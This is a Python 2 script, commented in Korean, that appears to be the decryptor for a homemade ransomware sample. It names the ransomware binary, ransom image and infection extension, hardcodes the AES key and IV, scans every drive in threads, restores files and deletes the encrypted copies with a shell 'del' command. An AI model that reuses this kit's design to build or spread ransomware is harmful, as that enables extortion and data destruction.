#-*- coding: utf-8 -*-
import os, Crypto, hashlib, threading
import Crypto.Random
from Crypto.Cipher import AES

VirusFile="C:\\Windows\\Decorate.exe" # 랜섬웨어 프로그램
InfectionImageFile="C:\\Windows\\Warning.png" # 랜섬웨어 감염 화면으로 사용할 이미지 파일
InfectionImageFile2="C:\\Users\\Public\\Desktop\\Warning.png"
SearchDrive=["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "A:\\", "B:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"] # 복호화 진행할 드라이브 리스트
ExceptDirectoryList=["C:\\Windows", "C:\\Program Files\\Common Files"] # 복호화 하지 않을(암호화 되지 않은) 디렉터리 리스트로 하위 디렉터리 포함(현재 C드라이브에 윈도우가 설치돼 있다고 가정)
ExceptFileList=[VirusFile, InfectionImageFile, InfectionImageFile2] # 복호화 하지 않을(암호화 되지 않은) 파일 리스트
FileNameExtension="[RansomWare@Hack.ABC].java" # 감염 확장자
key="ug3vdm7pa2jxt5hyb0qlc6zk1iwf9sn8eor4" # 복호화에 사용될 키 값
InitializationVector="f8u5qh9v0gl6w1j3" # 초기화 벡터로 CBC(Cipher Block Chaining) Mode로 암호화 했으므로 초기화 벡터는 16Byte가 되야함
sem=threading.Semaphore(10) # 세마포어 설정

def gen_sha256_hashed_key_salt(key): # SHA(256) 해시 함수
    salt1=hashlib.sha256(key).digest() # 설정한 Key를 해싱해 솔트 값 생성
    return hashlib.sha256(salt1+key).digest() # 생성한 솔트 값과 설정한 Key를 합해 해싱

def AES256Decrypt(key, iv, cipher): # 복호화 함수
    decryptor=AES.new(gen_sha256_hashed_key_salt(key), AES.MODE_CBC, IV=iv) # SHA(256) 해시 함수로 메세지 다이제스트 생성, 블록 암호화 방식 중 하나인 CBC(Cipher Block Chaining) 사용 
    plain=decryptor.decrypt(cipher) # 복호화 후 평문 얻음
    plain=plain[0:-ord(plain[-1])]
    return plain # 평문 반환

def DecryptFunc(File): # 복호화 함수
    try:
        sem.acquire() # 임계영역 생성
        fp=open(File, "rb") # 파일을 열어서 암호문(암호화된 바이너리)을 얻음
        FileBinary=fp.read()
        fp.close()
        decrypted=AES256Decrypt(key, InitializationVector, FileBinary) # 키 값과 초기화 벡터를 이용해 바이너리를 복호화
        #decrypted=AES256Decrypt(key, encrypted['iv'], encrypted['cipher'])
        OriginalFile=File # 원본 파일명이 저장될 변수
        OriginalFile=OriginalFile.replace(OriginalFile[len(File)-len(FileNameExtension)-1:], "") # 감염 확장자명 제거
        fp=open(OriginalFile, "wb") # 파일을 열어서 평문(복호화된 바이너리=원본 프로그램의 바이너리)을 덮음
        fp.write(decrypted)
        fp.close()
        os.system("del /q \""+File+"\"") # 암호화된 파일(감염 파일) 삭제
        print "[+] "+OriginalFile
        sem.release() # 임계영역 해제
    except Exception, e:
        pass

def RecursiveFunc(Directory): # 디렉터리 재귀 탐색 함수
    try:
        for MainDirectory, SubDirectories, Files in os.walk(Directory): # 디렉터리 탐색
            MainDirectoryName=MainDirectory # 메인 디렉터리
            DconValue=0 # 예외 디렉터리 확인 변수
            for ExceptDirectory in ExceptDirectoryList:
                if ExceptDirectory in MainDirectoryName: # 현재 탐색된 디렉터리가 예외 디렉터리 및 예외 디렉터리의 하위 디렉터리인 경우
                    DconValue=1 # 값 재설정
                    break
            if(DconValue==1): # 현재 탐색된 디렉터리가 예외 디렉터리 및 예외 디렉터리의 하위 디렉터리인 경우 탐색 생략
                continue
            for SubDirectory in SubDirectories: # 메인 디렉터리 내 서브 디렉터리들 탐색
                SubDirectoryName=MainDirectoryName+SubDirectory # 서브 디렉터리                    
                RecursiveFunc(SubDirectoryName) # 재귀 진입
                break
            for File in Files: # 메인&서브 디렉터리 내 파일들
                FileName=MainDirectoryName+"\\"+File # 복호화 할 파일
                FconValue=0 # 예외 파일 확인 변수
                for ExceptFile in ExceptFileList:
                    if(FileName==ExceptFile): # 현재 탐색된 파일이 예외 파일인 경우
                        FconValue=1 # 값 재설정
                        break
                if(FconValue==1): # 현재 탐색된 파일이 예외 파일인 경우 복호화 생략
                    continue
                if FileNameExtension in FileName: # 암호화된 파일만 복호화
                    DecryptFunc(FileName) # 복호화
    except Exception, e:
        pass
                
def SearchFunc(): # 파일 탐색 함수
    try:
        threads=[]
        for Drive in SearchDrive: # 드라이브 차례로 탐색
            th=threading.Thread(target=RecursiveFunc, args=(Drive,)) # 스레드 세팅
            th.start() # 스레드 생성
            threads.append(th) # 생성된 스레드 저장
            if(len(threads) > 300): # 생성된 스레드의 수가 300개 초과일 경우
                for th in threads: 
                    th.join() # 스레드 종료 대기
                threads=[]
        for th in threads:
            th.join()
    except Exception, e:
        pass

def main():
    SearchFunc() # 디렉터리 탐색 후 파일 복호화
    
if __name__=="__main__":
    main()
